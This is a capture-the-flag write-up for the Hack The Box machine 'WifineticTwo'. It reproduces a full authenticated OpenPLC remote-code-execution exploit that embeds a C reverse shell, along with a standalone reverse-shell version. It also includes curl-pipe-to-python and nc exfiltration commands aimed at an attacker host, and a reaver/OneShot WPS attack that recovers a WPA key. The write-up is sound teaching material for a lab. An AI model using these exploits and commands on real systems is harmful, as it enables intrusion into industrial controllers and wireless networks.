---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# WifineticTwo

Fair warning first. The box is quite unstable. You might need few restarts now and there to get it working.

## Enumeration

### Nmap

```
 nmap -sV -sC 10.10.11.7
```

This will find two open ports TCP 22 (SSH) and TCP 8080 (HTTP). Let's start with the second one.

## 8080 (HTTP)

Accessing it via browser redirects to a OpenPLC web portal login page.

### Directory search

For a good measure fire-up `feroxbuster` to scan the directories.

```
feroxbuster -u http://10.10.11.7:8080 -r --insecure
```

It also finds a login page.

### Login

The first think to do is try default credentials. A quick google search yields `openplc:openplc`. And it really works.

Now inside let's look around. There is a control panel allowing for uploading and executing PLC programs. Also a dashboard that monitors their execution. So far there is only `blank_program.st`.

### Exploit

A quick google search drops an exploit, requiring authenticated user (what a coincidence). https://www.exploit-db.com/exploits/49803

However, it did not worked. Poking around, I noticed "file not found" error. That is interesting. Let's try to modify an existing program. Thus, changing all the filenames to `blank_program.st`. The resulting exploit is as follows:

```
# Exploit Title: OpenPLC 3 - Remote Code Execution (Authenticated)
# Date: 25/04/2021
# Exploit Author: Fellipe Oliveira
# Vendor Homepage: https://www.openplcproject.com/
# Software Link: https://github.com/thiagoralves/OpenPLC_v3
# Version: OpenPLC v3
# Tested on: Ubuntu 16.04,Debian 9,Debian 10 Buster

#/usr/bin/python3

import requests
import sys
import time
import optparse
import re

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://target-uri:8080)")
parser.add_option('-l', '--user', action="store", dest="user", help="User credential to login")
parser.add_option('-p', '--passw', action="store", dest="passw", help="Pass credential to login")
parser.add_option('-i', '--rip', action="store", dest="rip", help="IP for Reverse Connection")
parser.add_option('-r', '--rport', action="store", dest="rport", help="Port for Reverse Connection")

options, args = parser.parse_args()
if not options.url:
    print('[+] Remote Code Execution on OpenPLC_v3 WebServer')
    print('[+] Specify an url target')
    print("[+] Example usage: exploit.py -u http://target-uri:8080 -l admin -p admin -i 192.168.1.54 -r 4444")
    exit()

host = options.url
login = options.url + '/login' 
upload_program = options.url + '/programs'
compile_program = options.url + '/compile-program?file=blank_program.st' 
run_plc_server = options.url + '/start_plc'
user = options.user
password = options.passw
rev_ip = options.rip
rev_port = options.rport
x = requests.Session()

def auth():
    print('[+] Remote Code Execution on OpenPLC_v3 WebServer')
    time.sleep(1)
    print('[+] Checking if host '+host+' is Up...')
    host_up = x.get(host)
    try:
        if host_up.status_code == 200:
            print('[+] Host Up! ...')
    except:
        print('[+] This host seems to be down :( ')
        sys.exit(0)

    print('[+] Trying to authenticate with credentials '+user+':'+password+'') 
    time.sleep(1)   
    submit = {
        'username': user,
        'password': password
    }
    x.post(login, data=submit)
    response = x.get(upload_program)
            
    if len(response.text) > 30000 and response.status_code == 200:
        print('[+] Login success!')
        time.sleep(1)
    else:
        print('[x] Login failed :(')
        sys.exit(0)  

def injection():
    print('[+] PLC program uploading... ')
    upload_url = host + "/upload-program" 
    upload_cookies = {"session": ".eJw9z7FuwjAUheFXqTx3CE5YInVI5RQR6V4rlSPrekEFXIKJ0yiASi7i3Zt26HamT-e_i83n6M-tyC_j1T-LzXEv8rt42opcIEOCCtgFysiWKZgic-otkK2XLr53zhQTylpiOC2cKTPkYt7NDSMlJJtv4NcO1Zq1wQhMqbYk9YokMSWgDgnK6qRXVevsbPC-1bZqicsJw2F2YeksTWiqANwkNFsQXdSKUlB16gIskMsbhF9_9yIe8_fBj_Gj9_3lv-Z69uNfkvgafD90O_H4ARVeT-s.YGvgPw.qwEcF3rMliGcTgQ4zI4RInBZrqE"}
    upload_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------210749863411176965311768214500", "Origin": host, "Connection": "close", "Referer": host + "/programs", "Upgrade-Insecure-Requests": "1"} 
    upload_data = "-----------------------------210749863411176965311768214500\r\nContent-Disposition: form-data; name=\"file\"; filename=\"program.st\"\r\nContent-Type: application/vnd.sailingtracker.track\r\n\r\nPROGRAM prog0\n  VAR\n    var_in : BOOL;\n    var_out : BOOL;\n  END_VAR\n\n  var_out := var_in;\nEND_PROGRAM\n\n\nCONFIGURATION Config0\n\n  RESOURCE Res0 ON PLC\n    TASK Main(INTERVAL := T#50ms,PRIORITY := 0);\n    PROGRAM Inst0 WITH Main : prog0;\n  END_RESOURCE\nEND_CONFIGURATION\n\r\n-----------------------------210749863411176965311768214500\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload Program\r\n-----------------------------210749863411176965311768214500--\r\n"
    upload = x.post(upload_url, headers=upload_headers, cookies=upload_cookies, data=upload_data)

    act_url = host + "/upload-program-action"
    act_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------374516738927889180582770224000", "Origin": host, "Connection": "close", "Referer": host + "/upload-program", "Upgrade-Insecure-Requests": "1"}
    act_data = "-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_name\"\r\n\r\nprogram.st\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_descr\"\r\n\r\n\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_file\"\r\n\r\nblank_program.st\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"epoch_time\"\r\n\r\n1617682656\r\n-----------------------------374516738927889180582770224000--\r\n"
    upload_act = x.post(act_url, headers=act_headers, data=act_data)
    time.sleep(2)

def connection():
    print('[+] Attempt to Code injection...')
    inject_url = host + "/hardware"
    inject_dash = host + "/dashboard"
    inject_cookies = {"session": ".eJw9z7FuwjAUheFXqTx3CE5YInVI5RQR6V4rlSPrekEFXIKJ0yiASi7i3Zt26HamT-e_i83n6M-tyC_j1T-LzXEv8rt42opcIEOCCtgFysiWKZgic-otkK2XLr53zhQTylpiOC2cKTPkYt7NDSMlJJtv4NcO1Zq1wQhMqbYk9YokMSWgDgnK6qRXVevsbPC-1bZqicsJw2F2YeksTWiqANwkNFsQXdSKUlB16gIskMsbhF9_9yIe8_fBj_Gj9_3lv-Z69uNfkvgafD90O_H4ARVeT-s.YGvyFA.2NQ7ZYcNZ74ci2miLkefHCai2Fk"}
    inject_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------289530314119386812901408558722", "Origin": host, "Connection": "close", "Referer": host + "/hardware", "Upgrade-Insecure-Requests": "1"}
    inject_data = "-----------------------------289530314119386812901408558722\r\nContent-Disposition: form-data; name=\"hardware_layer\"\r\n\r\nblank_linux\r\n-----------------------------289530314119386812901408558722\r\nContent-Disposition: form-data; name=\"custom_layer_code\"\r\n\r\n#include \"ladder.h\"\r\n#include <stdio.h>\r\n#include <sys/socket.h>\r\n#include <sys/types.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <netinet/in.h>\r\n#include <arpa/inet.h>\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n\r\n//-----------------------------------------------------------------------------\r\nint ignored_bool_inputs[] = {-1};\r\nint ignored_bool_outputs[] = {-1};\r\nint ignored_int_inputs[] = {-1};\r\nint ignored_int_outputs[] = {-1};\r\n\r\n//-----------------------------------------------------------------------------\r\n\r\n//-----------------------------------------------------------------------------\r\nvoid initCustomLayer()\r\n{\r\n   \r\n    \r\n    \r\n}\r\n\r\n\r\nvoid updateCustomIn()\r\n{\r\n\r\n}\r\n\r\n\r\nvoid updateCustomOut()\r\n{\r\n    int port = "+rev_port+";\r\n    struct sockaddr_in revsockaddr;\r\n\r\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\r\n    revsockaddr.sin_family = AF_INET;       \r\n    revsockaddr.sin_port = htons(port);\r\n    revsockaddr.sin_addr.s_addr = inet_addr(\""+rev_ip+"\");\r\n\r\n    connect(sockt, (struct sockaddr *) &revsockaddr, \r\n    sizeof(revsockaddr));\r\n    dup2(sockt, 0);\r\n    dup2(sockt, 1);\r\n    dup2(sockt, 2);\r\n\r\n    char * const argv[] = {\"/bin/sh\", NULL};\r\n    execve(\"/bin/sh\", argv, NULL);\r\n\r\n    return 0;  \r\n    \r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n-----------------------------289530314119386812901408558722--\r\n"
    print(inject_data)
    inject = x.post(inject_url, headers=inject_headers, cookies=inject_cookies, data=inject_data)
    time.sleep(3)
    comp = x.get(compile_program)
    time.sleep(6)
    x.get(inject_dash)
    time.sleep(3)
    print('[+] Spawning Reverse Shell...')
    start = x.get(run_plc_server)
    time.sleep(1)
    if start.status_code == 200:
        print('[+] Reverse connection receveid!') 
        sys.exit(0)
    else:
        print('[+] Failed to receive connection :(')
        sys.exit(0)

auth()
injection()
connection()     
```

Then the script is execured as:

```
# Run listener as: nc -lvnp 80
python3 openplc.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.106 -r 80
```

And that does gives the reverse shell!

As usual, let's also upgrade the shell to a nice TTY one.

```
python3 -m http.server 8080
python2 tcp_pty_shell_handler.py -b 0.0.0.0:443
# On remote
curl 10.10.14.82:8080/tcp_pty_backconnect.py | python3
```

#### Alternative Exploit Path

Alternatively, the C code from the python exploit can be extracted (clean it up) and copied directly into the `Hardware` tab. After saving it compiles. Then press`Run PLC` to get the shell. The C code is as follows:

```
#include "ladder.h"
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//-----------------------------------------------------------------------------

//-----------------------------------------------------------------------------
int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

//-----------------------------------------------------------------------------

//-----------------------------------------------------------------------------
void initCustomLayer()
{
}
void updateCustomIn()
{
}
void updateCustomOut()
{
    int port = 80;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.39");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
```

Keep in mind that the box is very unstable. It might not work on first, second, third, .. try. Just restart the box and try again.

## Privesc

But wait, I already got a root shell. What's more, the user flag is in `/root` directory. A possible explanation is that we are in a docker. That would be a fair assumption for having the root. Executing `uname -a` refutes this hypothesis.

But, given the name, the box have probably something to do with Wi-Fi, so let's check that fist and perhaps follow the lead.

### WLAN scanning

As I have little idea where to look (beyond some general knowledge), let's consult HackTricks https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi

Fist list the interfaces

```
iwconfig
ip a
```

Then scan the interface for Wi-Fi to connect

```
root@attica02:/tmp/.rmann# iw dev wlan0 scan
BSS 02:00:00:00:01:00(on wlan0)
        last seen: 601.088s [boottime]
        TSF: 1711119746426421 usec (19804d, 15:02:26)
        freq: 2412
        beacon interval: 100 TUs
        capability: ESS Privacy ShortSlotTime (0x0411)
        signal: -30.00 dBm
        last seen: 0 ms ago
        Information elements from Probe Response frame:
        SSID: plcrouter
        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
        DS Parameter set: channel 1
        ERP: Barker_Preamble_Mode
        Extended supported rates: 24.0 36.0 48.0 54.0 
        RSN:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: PSK
                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
        Supported operating classes:
                 * current operating class: 81
        Extended capabilities:
                 * Extended Channel Switching
                 * SSID List
                 * Operating Mode Notification
        WPS:     * Version: 1.0
                 * Wi-Fi Protected Setup State: 2 (Configured)
                 * Response Type: 3 (AP)
                 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
                 * Manufacturer:  
                 * Model:  
                 * Model Number:  
                 * Serial Number:  
                 * Primary Device Type: 0-00000000-0
                 * Device name:  
                 * Config methods: Label, Display, Keypad
                 * Version2: 2.0
```

#### Sniffing

Noticeably, the interface is in `managed` mode. Meaning, it can connect to a network. But, since I got no information about it, it is good idea to start sniffing the traffic and to see if someting would pop-up.

First, I need to switch to a `monitor` mode

```
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

To switch back

```
ifconfig wlan0 down
iwconfig wlan0 mode managed
ifconfig wlan0 up
```

Now, I need tools for sniffing.

##### tcpdump

For that, I can use `tcpdump`. But to run it on the server, I need statically-compiled version. Luckliy, there is a repository wiht just that. https://github.com/chovanecadam/static-toolbox The static binaries are available as job artefacts, as the jobs are compiling the stuff. Kudos Adam!

Now just to upload it to the remote, run, and then exfiltrate the dump.

```
curl 10.10.14.106:8080/tcpdump > tcpdump
chmod +x tcpdump
ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up

./tcpdump -i wlan0 -n -w data.pcap

# Fire-up a listener: nc -lvnp 4444 > dump.pcap
nc -vn 10.10.14.106 4444 < dump.pcap
```

But analysing it did not gave anyting useful. *HOWEVER*, if you are on a shared HTB instance, you can receive a connection with IP address. Those are probably other players connecting the final target. More to this in beyond root.

##### airodump-ng

Alternatively, `airodump-ng` can be used. But you need to compile it yourself. The repository contains a guide for that. https://github.com/aircrack-ng/aircrack-ng *NOTE*: `airodump-ng` works, but for `aircrack-ng` there are some caveats.

```
curl 10.10.14.106:8888/airodump-ng > airodump-ng
chmod +x airodump-ng

./airodump-ng wlan0 --write dump --output-format pcap

# Fire-up a listener: nc -lvnp 4444 > dump-01.cap
nc -vn 10.10.14.106 4444 < dump-01.cap
```

### WPS attack

There is one remarkable thing about the Wi-Fi. It got WPS, which is used for easy set-up of wifi connection, utilising PIN or physical button pushing. Still, since it is present, it is reasonable to try to attack it, as there are attacks that exploits PIN vulnerabilities.

For that, I will use `reaver` tool. But first, I need to copy the binary (and libs) to the remote machine

```
which reaver
cp /usr/bin/reaver reaver
curl 10.10.14.106:8080/reaver > reaver

find /usr -name "libpcap.so"
cp /usr/lib/x86_64-linux-gnu/libpcap.so libpcap.so
curl 10.10.14.106:8080/libpcap.so > libpcap.so.0.8

export LD_LIBRARY_PATH=\$LD_LIBRARY_PATH:./
```

Ok, now to run it

```
./reaver -i wlan0 -b 02:00:00:00:01:00 -vvv
```

Where the `02:00:00:00:01:00` is BSS known from scanning. Success! That yield a PIN `12345670`! However, I would still need a password to connect to the network. The reaver should give it, but it did not. Let's try some different tool.

Googling around, `OneShot` seems promising. Let's try it. Download it from https://github.com/fulvius31/OneShot, upload the script to remote and run it (with the PIN from `reaver`).

```
root@attica01:/dev/shm# python3 p.py -i wlan0 -p 12345670 --bssid 02:00:00:00:01:00
[*] Running wpa_supplicant…
[*] BSSID not specified (--bssid): scanning for available networks
Networks list:
#    BSSID              ESSID                     Sec.     PWR  WSC device name             WSC model
1)   02:00:00:00:01:00  plcrouter                 WPA2     -30                                 
Select target (press Enter to refresh): 1
[*] Running wpa_supplicant…
[*] Trying PIN '12345670'…
[*] Scanning…
[*] Authenticating…
[+] Authenticated
[*] Associating with AP…
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response…
[*] Received WPS Message M1
[*] Sending WPS Message M2…
[*] Received WPS Message M3
[*] Sending WPS Message M4…
[*] Received WPS Message M5
[+] The first half of the PIN is valid
[*] Sending WPS Message M6…
[*] Received WPS Message M7
[+] WPS PIN: '12345670'
[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
[+] AP SSID: 'plcrouter'
```

Great! That's the password!

### Connecting to Wi-Fi

Connecting to Wi-Fi from shell can be quite challenging.

1. Switch to managed mode (if not done already)

```
ifconfig wlan0 down
iwconfig wlan0 mode managed
ifconfig wlan0 up
```

2. create wpa_supplicant config, specifing the network name (`plcrouter`) and password

```
wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123! | tee wpa_supplicant.conf
```

3. Use the config to connect to the wifi

```
wpa_supplicant -c wpa_supplicant.conf -i wlan0 -B
```

Here, I have encountered some problems. I had to run it several times (with or without the `-B` flag). After checking `ip a` few times, I finally got the status as UP.

However, there is one more thing. There is no IP. Running `ip a` shows:

```
root@attica02:/tmp# ip a                                                  
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 : 1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if19: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:fb:30:c8 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.3.3/24 brd 10.0.3.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet 10.0.3.44/24 metric 100 brd 10.0.3.255 scope global secondary dynamic eth0
       valid_lft 2426sec preferred_lft 2426sec
    inet6 fe80: 216:3eff:fefb:30c8/64 scope link 
       valid_lft forever preferred_lft forever
6: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
    inet6 fe80: ff:fe00:300/64 scope link 
       valid_lft forever preferred_lft forever
```

Looking closer on the addresses, there is IPv6! Well, that makes sense, as it is resolved based on MAC.

### Connecting to the router

Let's scan the network using the IPv6 address. For that, we can use the nice properties of IPv6 multicast to all local devices (address `ff02: 1%wlan0`)

```
root@attica02:/tmp# ping6 ff02: 1%wlan0
PING ff02: 1%wlan0(ff02: 1%wlan0) 56 data bytes
64 bytes from fe80: ff:fe00:300%wlan0: icmp_seq=1 ttl=64 time=0.059 ms
64 bytes from fe80: ff:fe00:100%wlan0: icmp_seq=1 ttl=64 time=0.190 ms
```

The `fe80: ff:fe00:300%wlan0` is us, but what about the `fe80: ff:fe00:100%wlan0`? Let's scan it using Adam's static `nmap`. https://github.com/chovanecadam/static-toolbox

```
root@attica02:/tmp# ./nmap -6 -Pn fe80: ff:fe00:100%wlan0    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-22 23:14 UTC
Unable to find nmap-services!  Resorting to /etc/services
Unable to find nmap-protocols!  Resorting to /etc/protocols
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Nmap scan report for fe80: ff:fe00:100
Host is up (0.000038s latency).
Not shown: 1152 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
443/tcp open  https
MAC Address: 02:00:00:00:01:00 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

Those are interesting ports. While 80 and 443 does not give anything substantial. The SSH on 20 does not need a password!

```
root@attica02:/tmp# ssh root@fe80: ff:fe00:100%wlan0

BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)

  ___                             __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |___||   __|_|__|__||||__|  ||
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 OpenWrt 23.05.2, r23630-842932a63d
 -----------------------------------------------------
=== WARNING! =====================================
There is no root password defined on this device!
Use the "passwd" command to set up a new password
in order to prevent unauthorized SSH logins.
--------------------------------------------------
```

Cool! Now to just get the flag and go home.

```
root@ap:~# ls
root.txt
root@ap:~# cat root.txt
```

## Beyond Root

There is an alternative path of connecting to the Wi-Fi and getting IP. By listening to the traffic (on shared instance), we can get lucky and catch a connection to the router with IP. With that, we can assign an IPv4 IP to our machine and connect to the router. This might be legit in real scenario, where there is traffic, but I don't think this is the intended way.

Set the IP address, based on subnet from packet capture

```
ifconfig wlan0 192.168.1.69 netmask 255.255.255.0
```

Now either use  [chisel](https://github.com/jpillora/chisel) to set up a socks tunnel, or use static [nmap](https://github.com/chovanecadam/static-toolbox) directly. From here, continute with scanning and SSH as normal.